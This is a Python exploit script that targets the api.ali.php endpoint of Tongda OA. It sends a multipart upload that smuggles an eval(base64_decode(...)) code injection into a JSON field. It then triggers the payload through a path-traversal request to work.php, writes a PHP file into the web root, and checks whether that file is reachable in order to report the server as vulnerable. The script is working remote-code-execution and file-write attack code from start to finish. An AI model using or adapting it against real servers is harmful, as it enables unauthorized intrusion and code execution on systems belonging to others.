import requests
import urllib3
import time
import sys
import base64
from random import Random

urllib3.disable_warnings()

timeArray=time.localtime()
otherStyleTime=time.strftime('%Y%m',timeArray)
a=otherStyleTime[2:6]

sign = ''
chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
length = len(chars) - 1
random = Random()
for i in range(8):
    sign += chars[random.randint(0, length)]

bianma = '''file_put_contents('../../fb6790f4.php','<?php echo "This is unsafe by {}";?>');'''.format(sign)
base64bianma = base64.b64encode(bianma.encode('utf-8'))
base64bianma1=str(base64bianma,'utf-8')

payload='''--502f67681799b07e4de6b503655f5cae\r\nContent-Disposition: form-data; name="file"; filename="'''+sign+'''.json"\r\nContent-Type: application/octet-stream\r\n\r\n{"modular":"AllVariable","a":"'''+base64bianma1+'''","dataAnalysis":"{\\"a\\":\\"錦',$BackData[dataAnalysis] => eval(base64_decode($BackData[a])));/*\\"}"}\r\n--502f67681799b07e4de6b503655f5cae--'''

header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:93.0) Gecko/20100101 Firefox/93.0",
          "Content-Type": "multipart/form-data; boundary=502f67681799b07e4de6b503655f5cae",
          "Accept-Encoding": "gzip"
          }
payload2='/mobile/api/api.ali.php'
payload3='/inc/package/work.php?id=../../../../attach/approve_center/{}/>>>>>>>>>>>.{}'.format(a,sign)
payload4 = '/fb6790f4.php'
proxies = {'http': 'http://localhost:8080', 'https': 'http://localhost:8080'}

def test(host):
    url = host+payload2
    url2 = host+payload3
    url3 = host+payload4
    try:
        requests.post(url, headers=header, timeout=15, verify=False,data=payload.encode())
        requests.get(url2,timeout=15, verify=False)
        req2 = requests.get(url3,timeout=15, verify=False)
        if req2.status_code == 200:
            print(host+" 存在通达api.ali.php任意文件上传漏洞")
            print("返回路径：" + url3+"\n")
        else:
            print(host + " 不存在通达 api.ali.php任意文件上传漏洞")
    except Exception as e:
        print(host + " 不存在通达OA api.ali.php任意文件上传漏洞"+e)

if __name__=="__main__":
    host = sys.argv[1]
    test(host)
